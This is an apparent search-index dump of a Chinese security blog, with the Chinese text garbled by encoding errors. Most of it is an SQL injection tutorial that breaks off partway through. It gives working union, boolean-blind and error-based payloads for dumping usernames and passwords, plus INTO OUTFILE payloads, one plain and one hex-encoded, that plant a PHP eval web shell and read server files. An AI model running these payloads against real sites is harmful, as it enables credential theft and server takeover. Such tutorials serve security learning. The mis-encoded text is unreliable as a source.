deflateConnection: closeUpgrade-Insecure-Requests: 1Cache-Control: max-age=0dbName=myapp?a=&#x27; union select (select pwd from user)# SQLæ³¨å…¥è·å–ç”¨æˆ·è´¦å·å—å’Œå¯†ç  ç™»é™†æˆåŠŸ å¯¹æ–¹å›æ˜¾æ•°æ®ï¼šä¸€æ®µ ro0ABå¼€å¤´çš„æ•°æ® å…ˆè¿›è¡Œbase64è§£å¯† ä½¿ç”¨serializationDumperå·¥å…·è¿›è¡Œè§£æååºåˆ—è¯çš„æ•°æ® java -jar SerializationDumper.jar base64 https://www.cnblogs.com/20175211lyz/p/11403397.html https://www.cnblogs.com/niceyoo/p/10596657.html","categories":[{"name":"WEBæ¼æ´è¯¦è§£","slug":"WEBæ¼æ´è¯¦è§£","permalink":"https://xizhi-future.github.io/categories/WEB%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/"}],"tags":[{"name":"åºåˆ—åŒ–ä¸ååºåˆ—åŒ–","slug":"åºåˆ—åŒ–ä¸ååºåˆ—åŒ–","permalink":"https://xizhi-future.github.io/tags/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}],"author":"xizhi-future"},{"title":"SQLæ³¨å…¥å…¨è§£","slug":"SQL æ³¨å…¥å…¨è§£","date":"2021-10-07T10:07:52.000Z","updated":"2021-10-23T08:48:57.119Z","comments":true,"path":"2021/10/07/SQL æ³¨å…¥å…¨è§£/","link":"","permalink":"https://xizhi-future.github.io/2021/10/07/SQL%20%E6%B3%A8%E5%85%A5%E5%85%A8%E8%A7%A3/","excerpt":"","text":"[TOC] SQL æ³¨å…¥å…¨è§£SQL æ³¨å…¥ è¯¦è§£ ä¸€ã€æ³¨å…¥åˆ†ç±» æ³¨å…¥ç‚¹åˆ†ç±» æ•°å­—å‹æ³¨å…¥ å­—ç¬¦å‹æ³¨å…¥ï¼šå•å¼•å·ï¼ŒåŒå¼•å·ï¼ŒåŠ æ‹¬å·ç­‰ç­‰ æäº¤æ–¹å¼åˆ†ç±» GET æ–¹å¼æ³¨å…¥ POST æ–¹å¼æ³¨å…¥ COOKIE æ–¹å¼æ³¨å…¥ HTTP å¤´éƒ¨æ³¨å…¥ï¼šXFFï¼ŒUAï¼ŒREFRERE æ˜¯å¦å›æ˜¾ è”åˆæŸ¥è¯¢ å¸ƒå°”ç›²æ³¨ æŠ¥é”™æ³¨å…¥ æ—¶é—´ç›²æ³¨ äºŒæ¬¡æ³¨å…¥ å †å æŸ¥è¯¢ï¼ˆåŒæ—¶æ‰§è¡Œå¤šæ¡è¯­å¥ï¼‰ äºŒã€æ³¨å…¥åˆ¤æ–­ å·¥å…·æ‰«æï¼šç½‘ç«™æ¼æ‰«å·¥å…·ï¼ŒAWVSã€AppScanã€OWASP-ZAPã€Nessusç­‰ æ‰‹åŠ¨æµ‹è¯•ï¼š å•åŒå¼•å·ï¼Œæ‹¬å·ï¼Œè¿›è¡Œç»„åˆæµ‹è¯•ï¼Œçœ‹æ˜¯å¦æŠ¥é”™ å¯¹äºæ•°å­—å‹ ?id=3-1 ?id=2# å¦‚æœæ˜¾ç¤ºçš„æ˜¯ ?id=2 æ—¶çš„æ­£å¸¸é¡µé¢ï¼Œå°±è¯´æ˜æˆ‘ä»¬æ‰€å†™çš„è¡¨è¾¾å¼è¿›è¡Œäº†æ­£ç¡®è¿ç®—ï¼Œå¯åˆ¤æ–­æ³¨å…¥ç‚¹æ˜¯ æ•°å­—å‹æ³¨å…¥ï¼›å¦‚æœè¿”å›ä¸æ­£å¸¸ï¼Œåˆ™å¯èƒ½æ˜¯éæ•°å­—å‹æ³¨å…¥ã€‚ å¯¹äºå­—ç¬¦å‹ ?id=2a ?id=2&#39;# Mysql ä¸­ï¼Œç­‰å·ä¸¤è¾¹å¦‚æœç±»å‹ä¸ä¸€è‡´ï¼Œä¼šå‘ç”Ÿå¼ºåˆ¶ç±»å‹è½¬æ¢ã€‚å½“æ•°å­—ä¸å­—ç¬¦ä¸²è¿›è¡Œæ¯”è¾ƒæ—¶ï¼Œé¦–å…ˆå…ˆå°†å­—ç¬¦ä¸²è½¬æ¢æˆæ•°å­—ï¼Œç„¶åå†è¿›è¡Œæ¯”è¾ƒã€‚ç±»ä¼¼äº PHP é‡Œé¢çš„ å¼±ç±»å‹æ¯”è¾ƒ ==ã€‚ å¯¹äºå¸ƒå°”ç›²æ³¨ ?id=1&#39; and &#39;1 ?id=1&#39; and &#39;a è¿™é‡Œæ²¡æœ‰ä½¿ç”¨æ³¨é‡Šç¬¦å·è¿›è¡Œåé¢çš„å•å¼•å·é—­åˆï¼Œä½¿ç”¨çš„æ˜¯æ‰‹å·¥å•å¼•å·é—­åˆ æˆ–è€…ï¼Œ ?id=1&#39; and 1=1# ?id=1&#39; and 1=2# ä¸¤è€…çš„é¡µé¢æˆªç„¶ä¸åŒï¼Œä¸€ä¸ªæ­£å¸¸å›æ˜¾ï¼Œä¸€ä¸ªæ²¡æœ‰å›æ˜¾çš„è¯ï¼Œå°±å¯åˆ¤æ–­æ˜¯å¸ƒå°”ç›²æ³¨ã€‚ å¯¹äº æ—¶é—´ç›²æ³¨ ?id=1&#39; and sleep(3)# ï¼Œç±»ä¼¼çš„æœ‰ä»¥ä¸‹å‡ ç§ åœ¨MySQLä¸­ï¼Œæœ‰ä¸€ä¸ªBenchmark() å‡½æ•°ï¼Œå®ƒæ˜¯ç”¨äºæµ‹è¯•æ€§èƒ½çš„ã€‚ Benchmark(count,expr) ï¼Œè¿™ä¸ªå‡½æ•°æ‰§è¡Œçš„ç»“æœï¼Œæ˜¯å°†è¡¨è¾¾å¼ expr æ‰§è¡Œ count æ¬¡ ã€‚ å› æ­¤ï¼Œåˆ©ç”¨benchmarkå‡½æ•°ï¼Œå¯ä»¥è®©åŒä¸€ä¸ªå‡½æ•°æ‰§è¡Œè‹¥å¹²æ¬¡ï¼Œä½¿å¾—ç»“æœè¿”å›çš„æ—¶é—´æ¯”å¹³æ—¶è¦é•¿ï¼Œé€šè¿‡æ—¶é—´é•¿çŸ­çš„å˜åŒ–ï¼Œå¯ä»¥åˆ¤æ–­æ³¨å…¥è¯­å¥æ˜¯å¦æ‰§è¡ŒæˆåŠŸã€‚è¿™æ˜¯ä¸€ç§è¾¹ä¿¡é“æ”»å‡»ï¼Œè¿™ä¸ªæŠ€å·§åœ¨ç›²æ³¨ä¸­è¢«ç§°ä¸ºTiming Attackï¼Œä¹Ÿå°±æ˜¯æ—¶é—´ç›²æ³¨ã€‚ MySQL benchmark(100000000,md(5)) sleep(3) PostgreSQL PG_sleep(5) Generate_series(1,1000000) SQLServer waitfor delay â€˜0:0:5â€™åœ¨åˆ¤æ–­æ•°å€¼å‹å’Œå­—ç¬¦ä¸²æ³¨å…¥æ—¶è¿˜å¯ä»¥é€šè¿‡æäº¤æ•°å­¦å¼çš„æ–¹å¼æ¥åˆ¤æ–­ï¼Œå¦‚æäº¤â€™id=2/2â€™ï¼Œå¦‚æœå­—ç¬¦å‹åˆ™è¿”å›id=2çš„ç»“æœï¼Œå¦‚æœæ˜¯æ•°å€¼å‹åˆ™è¿”å›id=1çš„ç»“æœã€‚ åœ¨åˆ¤æ–­æ•°å€¼å‹å’Œå­—ç¬¦ä¸²æ³¨å…¥æ—¶è¿˜å¯ä»¥é€šè¿‡æäº¤æ•°å­¦å¼çš„æ–¹å¼æ¥åˆ¤æ–­ï¼Œå¦‚æäº¤â€™id=2/2â€™ï¼Œå¦‚æœå­—ç¬¦å‹åˆ™è¿”å›id=2çš„ç»“æœï¼Œå¦‚æœæ˜¯æ•°å€¼å‹åˆ™è¿”å›id=1çš„ç»“æœã€‚ å¸¸è§ SQL æ³¨å…¥åŠŸèƒ½ç‚¹ åªè¦æ˜¯å­˜åœ¨æ•°æ®åº“äº¤äº’çš„åœ°æ–¹éƒ½æœ‰å¯èƒ½å‡ºç° SQL æ³¨å…¥ã€‚ å¸¸å‡ºç°åœ¨ ç™»å½•é¡µé¢ã€è®¢å•é¡µé¢ã€æ–‡ç« æˆ–æ–°é—»å±•ç¤ºé¡µé¢ã€ä¿®æ”¹å¯†ç é¡µé¢ï¼ˆäºŒæ¬¡æ³¨å…¥ï¼‰ã€æ¶‰åŠè·å– HTTP å¤´ï¼ˆXFFç­‰ï¼‰çš„åŠŸèƒ½ç‚¹ç­‰ã€‚ æ³¨é‡Šï¼šâ€“+ # é—­åˆæ–¹æ³•ï¼šæ³¨é‡Šé—­åˆã€æ‰‹åŠ¨é—­åˆ and â€˜1 ä¸‰ã€Mysql æ³¨å…¥3.1 å¿…å¤‡12345æ³¨é‡Šï¼š# --/*......*//*!......*/ å…ƒæ•°æ®åº“ information_schema 12345678910111213141516å…ƒæ•°æ®åº“ information_schema ä¸­ï¼šå­˜æ”¾æ•°æ®åº“ä¿¡æ¯çš„è¡¨ï¼šschemataschemata è¡¨ä¸­å­—æ®µ schema_name å­˜æ”¾æ‰€æœ‰æ•°æ®åº“åï¼›å­˜æ”¾è¡¨ä¿¡æ¯çš„è¡¨ï¼štablestables è¡¨ä¸­å­—æ®µ table_name å­˜æ”¾æ‰€æœ‰è¡¨åå­—æ®µ table_schema å­˜æ”¾æ‰€æœ‰è¡¨æ‰€åœ¨çš„æ•°æ®åº“åï¼›å­˜æ”¾æ‰€æœ‰å­—æ®µä¿¡æ¯çš„è¡¨ï¼šcolumnscolumns è¡¨ä¸­å­—æ®µ column_name å­˜æ”¾æ‰€æœ‰å­—æ®µåï¼Œå­—æ®µ table_name å­˜æ”¾æ‰€æœ‰å­—æ®µæ‰€åœ¨çš„è¡¨åï¼Œå­—æ®µ table_schema å­˜æ”¾æ‰€æœ‰å­—æ®µæ‰€åœ¨çš„æ•°æ®åº“åï¼› è¯­å¥åˆ†ç±»ï¼š 123451.DQL(æ•°æ®æŸ¥è¯¢è¯­è¨€)ï¼šæŸ¥è¯¢è¯­å¥ï¼Œæ‰€æœ‰çš„ select è¯­å¥2.DML(æ•°æ®æ“ä½œè¯­è¨€)ï¼šinsert , delete , update , å¯¹è¡¨ä¸­çš„ æ•°æ® è¿›è¡Œ å¢åˆ æ”¹3.DDL(æ•°æ®å®šä¹‰è¯­è¨€)ï¼šcreate , drop , alter å¯¹è¡¨ ç»“æ„ çš„ å¢åˆ æ”¹4.TCL(äº‹åŠ¡æ§åˆ¶è¯­è¨€)ï¼šcommit æäº¤æ•°æ®ï¼Œrollback å›æ»šæ•°æ® Transaction5.DCL(æ•°æ®æ§åˆ¶è¯­è¨€)ï¼šgrant æˆæƒï¼Œrevoke æ’¤é”€æƒé™ç­‰ åŸºæœ¬è¯­å¥ï¼š 123456789101112131415161718# æŸ¥åº“ï¼šshow databasesï¼›select schema_name from information_schema.schemataï¼›# å»ºåº“ï¼šcreate database + åº“å;# åˆ åº“ï¼šdrop database + åº“å;# è¿›å…¥æ•°æ®åº“ï¼šuse + åº“åï¼›# æŸ¥è¡¨ï¼šshow tablesï¼›select table_name from information_schema.tables where table_schema=&#x27;security&#x27;ï¼›# æŸ¥åˆ—ï¼šselect * from usersï¼›select column_name from information_schema.columns where table_name=&#x27;users&#x27;ï¼›# æŸ¥å­—æ®µï¼šselect username,password from security.usersï¼› åŸºæœ¬å‡½æ•° 123456789101112131415161718192021222324252627282930313233343536373839#æ•°æ®åº“å®‰è£…ã€è·¯å¾„ï¼Œç”¨æˆ· ä¿¡æ¯version(); Mysql æ•°æ®åº“ç‰ˆæœ¬database(); å½“å‰ æ•°æ®åº“åuser(); æ•°æ®åº“çš„ç”¨æˆ·åcurrent_user(); å½“å‰ç”¨æˆ·åsession_user(); è¿æ¥åˆ°æ•°æ®åº“çš„ç”¨æˆ·åsystem_user(); ç³»ç»Ÿç”¨æˆ·å@@datadir(); æ•°æ®åº“æ–‡ä»¶çš„å­˜æ”¾è·¯å¾„@@version_compile_os; æ“ä½œç³»ç»Ÿç‰ˆæœ¬@@basedir; æ•°æ®åº“çš„å®‰è£…ç›®å½•#å­—ç¬¦ä¸²é•¿åº¦ã€æˆªå–length(); è¿”å›å­—ç¬¦ä¸²çš„é•¿åº¦substring(a,b,c); æˆªå–å­—ç¬¦ä¸²substr(a,b,c); mid(a,b,c); ä¸‰ä¸ªå‚æ•°ï¼ša.æˆªå–çš„å­—ç¬¦ä¸² b.æˆªå–çš„èµ·å§‹ä½ç½® c.é•¿åº¦left(a,b); ä»å·¦ä¾§æˆªå–açš„å‰bä½ï¼Œæ­£ç¡®è¿”å›1ï¼Œé”™è¯¯è¿”å›0#å­—ç¬¦ä¸²é…å¯¹è¿æ¥concat(a,0x5e,b); å­—ç¬¦ä¸²é…å¯¹è¿æ¥concat_ws(&#x27;~&#x27;,A,B); å«æœ‰åˆ†éš”ç¬¦çš„è¿æ¥å­—ç¬¦ä¸²group_concat(); å°†å­—ç¬¦ä¸²è¿æ¥ä¸ºä¸€ä¸ªç»„ï¼Œå¯å°†ä¸åŒåˆ—åˆ†åˆ°åŒä¸€è¡Œä¸­#å­—ç¬¦ä¸²ç‰¹æ®Šå¤„ç†ord(); è¿”å›ASCIIç ascii(&#x27;a&#x27;); å°†å­—æ¯ a è½¬æ¢ä¸ºasciiå€¼rand(); è¿”å›0~1ä¹‹é—´çš„éšæœºæµ®ç‚¹æ•°round(); è¿”å›æœ€è¿‘çš„æ•´æ•°å€¼md5(); è¿”å›MD5å€¼hex(); å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºåå…­è¿›åˆ¶unhex(); hex()çš„åå‘æ“ä½œfloor(x); è¿”å›ä¸å¤§äºxçš„æœ€å¤§æ•´æ•°load_file(); è¯»å–æ–‡ä»¶ï¼Œè¿”å›æ–‡ä»¶å†…å®¹ä½œä¸ºä¸€ä¸ªå­—ç¬¦ä¸²sleep(a); æ²‰ç¡aç§’if(true,t,f); åˆ¤æ–­è¯­å¥ä¸ºtrue ,æ‰§è¡Œç¬¬ä¸€ä¸ªï¼Œå¦åˆ™ç¬¬äºŒä¸ªfind_in_set(); è¿”å›å­—ç¬¦ä¸²åœ¨å­—ç¬¦ä¸²åˆ—è¡¨ä¸­çš„ä½ç½®benchmark(); æŒ‡å®šè¯­å¥æ‰§è¡Œçš„æ¬¡æ•°name_const(); è¿”å›è¡¨ä½œä¸ºç»“æœ å¯¼å…¥æ•°æ®ï¼š 12å½“å¸Œæœ›å¯¼å…¥ä¸€ä¸ª è¾ƒå¤§ çš„æ–‡ä»¶æˆ–è€…æ˜¯æƒ³è¦æ‰¹é‡çš„æ‰§è¡Œsqlè¯­å¥æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ mysql ä¸­çš„ source å‘½ä»¤ä½¿ç”¨æ–¹æ³•ï¼šsource + æ–‡ä»¶è·¯å¾„(ç›´æ¥æ‹–æ‹½) 3.2 è¯­å¥mysql å¯¹ è¡¨çš„ç»“æ„çš„æ›´æ”¹è¯­å¥ 12345678910111213141516171819# createcreate table è¡¨å( å­—æ®µå1ï¼Œæ•°æ®ç±»å‹ï¼Œ å­—æ®µå2ï¼Œæ•°æ®ç±»å‹ï¼Œ å­—æ®µå3ï¼Œæ•°æ®ç±»å‹ï¼Œ ......);# insertinsert into è¡¨å(å­—æ®µå1ï¼Œå­—æ®µå2ï¼Œå­—æ®µå3......) values(å€¼1ï¼Œå€¼2ï¼Œå€¼3......)ï¼›# deletedelete from è¡¨å where æ¡ä»¶;//å¯å›æ»šå¯¹äºå¤§è¡¨ï¼štruncate table è¡¨å;//ä¸å¯å›æ»šï¼Œå°†ä¼šæ°¸ä¹…ä¸¢å¤±# updateupdate è¡¨å set å­—æ®µå1=å€¼1,å­—æ®µå2=å€¼2,......where æ¡ä»¶ï¼› 12345678910111213141516# ä¿®æ”¹è¡¨åç§°ï¼šè¯­æ³•ä¸€ï¼š alter table tbl_name rename[to|as] new_tbl_name --å¯ä»¥æ›´æ”¹ä¸€å¼ æ•°æ®è¡¨åç§°è¯­æ³•äºŒï¼šrename table tbl_name to new_tbl_name [,tbl_name2 TO new_tbl_namewâ€¦â€¦ --å¯ä»¥å¤šè¡¨æ›´æ”¹åç§°#æ·»åŠ è¡¨åˆ—alter table test add column name varchar(10); #åˆ é™¤è¡¨åˆ—alter table test drop column name; #ä¿®æ”¹è¡¨åˆ—ç±»å‹alter table test modify address char(10) ||alter table test change address address char(40)#ä¿®æ”¹è¡¨åˆ—åalter table test change column address address1 varchar(30) å¸¸ç”¨å­—æ®µ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283# select select å­—æ®µ1ï¼Œå­—æ®µ2ï¼Œ...... from + è¡¨å where + æ¡ä»¶;# between and select * from users where id between 2 and 8;select * from users where id &gt;=2 and id &lt;=8;# in not inselect password from users where id not in(5,8);æŒ‡æŸ¥æ‰¾å‡º idä¸ç­‰äº5 å’Œ idä¸ç­‰äº8 çš„ç”¨æˆ·çš„å¯†ç æ³¨ï¼šä¸æ˜¯ 5~8ï¼Œinä¹‹åä¸æ˜¯ä¸€ä¸ªåŒºé—´ # like1.% ä»£è¡¨ä»»æ„å¤šä¸ªå­—ç¬¦2._ ä»£è¡¨ä»»æ„ä¸€ä¸ªå­—ç¬¦select username from users where username like &#x27;%b%&#x27;;æŒ‡æŸ¥æ‰¾å‡ºç”¨æˆ·åä¸­å¸¦æœ‰å­—æ¯bçš„ç”¨æˆ·åselect username from users where username like &#x27;_a%&#x27;;æŒ‡æŸ¥æ‰¾å‡ºç”¨æˆ·åä¸­å¸¦ç¬¬äºŒä¸ªå­—æ¯ä¸ºaçš„ç”¨æˆ·åselect username from users where username like &#x27;%b&#x27;;æŒ‡æŸ¥æ‰¾å‡ºç”¨æˆ·åä¸­å¸¦æœ€åä¸€ä¸ªå­—æ¯ä¸ºbçš„ç”¨æˆ·åselect username from users where username like &#x27;%\\_%&#x27;;æŒ‡æŸ¥æ‰¾å‡ºç”¨æˆ·åä¸­å¸¦æœ‰ä¸‹åˆ’çº¿_çš„ç”¨æˆ·åæ³¨ï¼šç‰¹æ®Šå­—ç¬¦éœ€è¦è½¬ä¹‰# order byselect username from users order by å­—æ®µåï¼›æ³¨ï¼šé»˜è®¤ä¸ºå‡åºæ’åˆ—æŒ‡å®šå‡åºï¼šascselect username from users order by å­—æ®µå ascï¼›æŒ‡å®šé™åºï¼šdescselect username from users order by å­—æ®µå descï¼›åŒé‡éœ€æ±‚ï¼šselect username from users order by å­—æ®µå1 desc,å­—æ®µå2 ascï¼›# åˆ†ç»„å‡½æ•°select sum(grade) from users;select avg(grade) from users;select max(grade) from users;select min(grade) from users;# ç©ºå¤„ç†å‡½æ•°select sum(ifnull(salary,0)*12), from crew;æ±‚ä¸€å¹´çš„è–ªæ°´ä¹‹å’Œï¼Œå½“è–ªæ°´ä¸ºNULLæ—¶ï¼Œè¢«å½“ä½œ0æ¥å¤„ç†# count(*) ä¸ countcount(*) :ç»Ÿè®¡æ€»è®°å½•æ¡æ•°ï¼Œè€Œä¸æ˜¯ç»Ÿè®¡æŸä¸ªå­—æ®µä¸­çš„æ•°æ®ï¼Œä¸å­—æ®µæ— å…³count(å…·ä½“çš„æŸä¸ªå­—æ®µ)ï¼šç»Ÿè®¡å…·ä½“å­—æ®µä¸­ä¸ä¸ºNULLçš„æ€»æ•°1.å­—ç¬¦ä¸²æ•°æ® sum,avg ä¸º 0ï¼Œmax,min æŒ‰å­—æ¯å¤§å°å–2.åˆ†ç»„å‡½æ•°ä¼šè‡ªåŠ¨å¿½ç•¥ NULL3.æ•°å­¦è¿ç®— ä¸­å¦‚æœæœ‰NULLå‚ä¸ï¼Œç»“æœä¸ºå®šä¸ºNULL4.åˆ†ç»„å‡½æ•°ä¸èƒ½ç›´æ¥å‡ºç°åœ¨ where åé¢ï¼ŒåŸå› æ˜¯ group by æ˜¯åœ¨whereè¯­å¥æ‰§è¡Œç»“æŸä¹‹åæ‰§è¡Œçš„5.åˆ†ç»„å‡½æ•°å¯ç»„åˆä½¿ç”¨# group by ä¸ havinggroup byï¼šæŒ‰ç…§æŸä¸ªå­—æ®µæˆ–æŸäº›å­—æ®µè¿›è¡Œåˆ†ç»„havingï¼šå¯¹åˆ†ç»„ä¹‹åçš„æ•°æ®è¿›è¡Œå†æ¬¡è¿‡æ»¤ï¼Œå³having å¿…é¡»è·Ÿåœ¨ group by åé¢ä½¿ç”¨select max(grade) from students group by classes;å…ˆæ ¹æ®ç­çº§åˆ†ç»„ï¼Œå†æŸ¥å‡ºå„ä¸ªç­çº§çš„æˆç»©æœ€é«˜å­¦ç”Ÿçš„æˆç»©1.åˆ†ç»„å‡½æ•°ä¸€èˆ¬ä¸ group by è”åˆä½¿ç”¨ï¼Œå¹¶ä¸”ä»»ä½•ä¸€ä¸ªåˆ†ç»„å‡½æ•°ï¼ˆcount,sum,avg,max,minï¼‰éƒ½æ˜¯åœ¨ group by è¯­å¥æ‰§è¡Œç»“æŸåæ‰ä¼šæ‰§è¡Œ2.å½“ä¸€æ¡sqlè¯­å¥æ²¡æœ‰ group by æ—¶ï¼Œæ•´å¼ è¡¨ä¼šè‡ªæˆä¸€ç»„3.å½“sqlè¯­å¥ä¸­ä½¿ç”¨group byæ—¶ï¼Œselectä¹‹ååªèƒ½è·Ÿå‚ä¸åˆ†ç»„çš„å­—æ®µæˆ–è€…åˆ†ç»„å‡½æ•°æ³¨ï¼šå®é™…ä¸Šåœ¨ mysql ä¸­ï¼Œå¯ä»¥ä½¿ç”¨å¹¶ä¸”æ‰§è¡Œï¼Œä½†æ¯«æ— æ„ä¹‰ï¼›è€Œç”±äº Oracle æ¯” Mysql è¦æ›´åŠ ä¸¥æ ¼ï¼Œåœ¨ Oracle ä¸­æ˜¯ç»å¯¹ä¸¥æ ¼ä¸èƒ½ä½¿ç”¨çš„ã€‚# distinct å»é‡distinct å…³é”®å­— å»é™¤é‡å¤è®°å½•select distinct job from company;æŸ¥è¯¢è¯¥å…¬å¸ä¸­çš„å·¥ä½œå²—ä½# è¯­å¥æ‰§è¡Œé¡ºåºselect 5å·ï¼šæŒ‘é€‰å‡ºæ»¡è¶³æ¡ä»¶çš„æ•°æ®from 1å·ï¼šå®šè¡¨where 2å·ï¼šè¿‡æ»¤åŸå§‹æ•°æ®group by 3å·ï¼šè¿›è¡Œåˆ†ç»„ having 4å·ï¼šå¯¹æ•°æ®è¿›è¡Œå†æ¬¡è¿‡æ»¤order by 6å·ï¼šè¿›è¡Œæ’åº 12345# inner joinselect a.ename,b.dname from emp a join dept b on a.deptno=b.deptno;# left/right joinselect dname,ename from dept a left join emp b on a.deptno=b.deptno; å››ã€union è”åˆæ³¨å…¥(å•å¼•å·é—­åˆå­—ç¬¦å‹ä¸ºä¾‹)æ³¨å…¥åˆ¤æ–­ 12?id=1&#x27;?id=1&#x27;# order by æŸ¥åˆ— 123?id=1&#x27; order by x--+?id=1&#x27; order by x## å…¶ä¸­xè¾“å…¥æ•°å­—ä»£è¡¨å“ªä¸€åˆ—ï¼Œä½¿ç”¨äºŒåˆ†æ³•ç¼©å°èŒƒå›´,xä¹‹åæ˜¯ä¸¤ä¸ªå‡å·ä¸åŠ å·ï¼Œä»£è¡¨æ³¨é‡Š åˆ¤æ–­å›æ˜¾ä½ç½®ï¼Œä¸‰åˆ—ä¸ºä¾‹ 12345?id=-1&#x27; union select 1,2,3--+?id=0&#x27; union select 1,2,3--+?id=1&#x27; and 1=2 union select 1,2,3--+# å‰é¢æ˜¯ä¸ºäº†å¦å®š id=1 æ—¶çš„å›æ˜¾ï¼Œé˜²æ­¢äººå®¶çš„ sql è¯­å¥åª limit 0,1 # è¿™æ ·å°±æ— æ³•æŸ¥çœ‹åˆ°æˆ‘ä»¬æƒ³è¦çš„ä¿¡æ¯äº† å›æ˜¾ä½ç½®æ³¨å…¥ sql è¯­å¥ 1?id=-1&#x27; union select 1,(select database()),3--+ æŸ¥åº“ 1?id=-1&#x27; union select 1,(select group_concat(schema_name) from information_schema.schemata),3--+ æŸ¥æŸä¸€ä¸ªåº“ä¸­çš„è¡¨ æ³¨æ„ï¼šä»…ä»…æ˜¯æŸ¥å½“å‰æ•°æ®åº“ database() çš„è¡¨ï¼Œç”±äºå¤„äºå½“å‰æ•°æ®åº“ä¸‹ï¼Œæ˜¯ä¸èƒ½æŸ¥çœ‹å…¶å®ƒæ•°æ®åº“ä¸­æ•°æ®çš„ 1?id=-1&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),3--+ æŸ¥åˆ— 1?id=-1&#x27; union select 1,(select group_concat(column_name) from information_schema.collumns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27;),3--+ æŸ¥å†…å®¹ï¼Œ~ è¿æ¥ 1234?id=-1&#x27; union select 1,(select group_concat(concat_ws(&#x27;~&#x27;,username,password))from security.users),3--+# åŒæ—¶æŸ¥ä¸‰åˆ—æ•°æ®çš„è¯?id=-1&#x27; union select 1,group_concat(id,&#x27;--&#x27;,username,&#x27;--&#x27;,password),3 from users# äº”ã€Boolean ç›²æ³¨5.1 æ‰‹åŠ¨ï¼šç»“åˆ Burp çˆ†ç ´è¿›è¡ŒæŸ¥æ•°æ®åº“é•¿åº¦ 12?id=1&#x27; and length(database())=1--+# çˆ†ç ´æ•°å­— 1 åˆ¤æ–­åº“åç»„æˆ security 12345?id=1&#x27; and left(database(),1)=&#x27;a&#x27;--+# çˆ†ç ´å­—æ¯ a?id=1&#x27; and ascii(substr(database(),1,1))=&#x27;b&#x27;--+# çˆ†ç ´ ascii å€¼ b æŸ¥è¡¨ users 12?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit a,1),1,1)) =&#x27;b&#x27;--+# åŒæ—¶çˆ†ç ´æ•°å­—a,å’Œ æ•°å­—bï¼Œå…¶ä¸­ b æ˜¯ ascii å€¼ æŸ¥åˆ— username password 12?id=1&#x27; and ascii(substr((select column_name from information_schema.tables where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit a,1),1,1)) = &#x27;b&#x27;--+# åŒæ—¶çˆ†ç ´æ•°å­—a,å’Œ æ•°å­—bï¼Œå…¶ä¸­ b æ˜¯ ascii å€¼ æŸ¥å†…å®¹ 12345?id=1&#x27; and ascii(substr((select username from security.users limit a,1),1,1))=&#x27;b&#x27;--+# çˆ†ç ´ ascii å€¼ b?id=1&#x27; and ascii(substr((select password from security.users limit 0,1),1,1))=&#x27;b&#x27;--+# çˆ†ç ´ ascii å€¼ b 5.2 è„šæœ¬1 å…­ã€äº”å¤§æŠ¥é”™æ³¨å…¥åˆ©ç”¨æ¡ä»¶ï¼šé¡µé¢å›æ˜¾ SQLè¯­å¥æ‰§è¡Œçš„é”™è¯¯ä¿¡æ¯ï¼Œä¾‹å¦‚ mysql_error() 12# floor()id = 1 and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a) 12# extractvalue()id = 1 and (extractvalue(1, concat(0x5c,(select user())))) updatexml() å‡½æ•°ï¼š è¿™ä¸ªå‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°æœ¬åº”è¯¥æ˜¯åˆæ³•çš„ XPATH è·¯å¾„ï¼Œå¦åˆ™å°±ä¼šåœ¨å¼•å‘æŠ¥é”™çš„åŒæ—¶å°†ä¼ å…¥çš„å‚æ•°è¿›è¡Œè¾“å‡ºã€‚æˆ‘ä»¬åˆ©ç”¨è¿™ä¸ªç‰¹å¾ï¼Œå½“é¢˜ç›®å­˜åœ¨å›æ˜¾æ—¶ï¼Œå°†æˆ‘ä»¬æƒ³çš„åˆ°çš„ä¿¡æ¯ä¼ å…¥è¿™ä¸ªå‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°å³å¯æŸ¥è¯¢ã€‚ 12# updatexml()id = 1 and (updatexml(0x3a,concat(1,(select user()),1))) 12# exp()id =1 and EXP(~(SELECT * from(select user())a)) 12345678910111213141516171819# å…­ç§å‡½æ•° (ä½¿ç”¨æ–¹æ³•ç›¸åŒ)GeometryCollection()id = 1 AND GeometryCollection((select * from (select * from(select user())a)b))polygon()id =1 AND polygon((select * from(select * from(select user())a)b))multipoint()id = 1 AND multipoint((select * from(select * from(select user())a)b))multilinestring()id = 1 AND multilinestring((select * from(select * from(select user())a)b))linestring()id = 1 AND LINESTRING((select * from(select * from(select user())a)b))multipolygon()id =1 AND multipolygon((select * from(select * from(select user())a)b)) ä¸ƒã€æ–‡ä»¶è¯»å†™7.1 æ‰‹åŠ¨å†™æ–‡ä»¶ 123?id=-1&#x27; union select 1,&quot;&lt;?php @eval(\\$_POST[1]); ?&gt;&quot;,3 into outfile &quot;/var/www/html/1.php&quot;--+# å¯å°†æ–‡ä»¶å†…å®¹è½¬æ¢æˆåå…­è¿›åˆ¶?id=-1&#x27; union select 1,0x3c3f70687020406576616c28245f504f53545b315d293b203f3e,3 into outfile &quot;/var/www/html/1.php&quot;--+ æœ‰å›æ˜¾æ—¶ è¯»å–æ–‡ä»¶ 123?id=-1&#x27; union select 1,2,load_file(&#x27;/var/www/html/1.php&#x27;)--+# æ–‡ä»¶è·¯å¾„ å¯ä½¿ç”¨ åå…­è¿›åˆ¶?id=-1&#x27; union select 1,2,load_file(0x2f7661722f7777772f68746d6c2f312e706870)--+ æ— å›æ˜¾ ç›²æ³¨è¯»å–æ–‡ä»¶ 12?id=-1&#x27; and ascii(mid((select hex(load_file(&#x27;/var/www/html/1.php&#x27;))),a,1))&gt;b--+# åŒæ—¶çˆ†ç ´ æ•°å­— a å’Œ ascii å€¼ b 7.2 è„šæœ¬123456789101112```## å…«ã€å»¶æ—¶æ³¨å…¥### 8.1 æ‰‹åŠ¨ï¼šç»“åˆ Burp Respondå½“é¡µé¢ä¸Šæ— 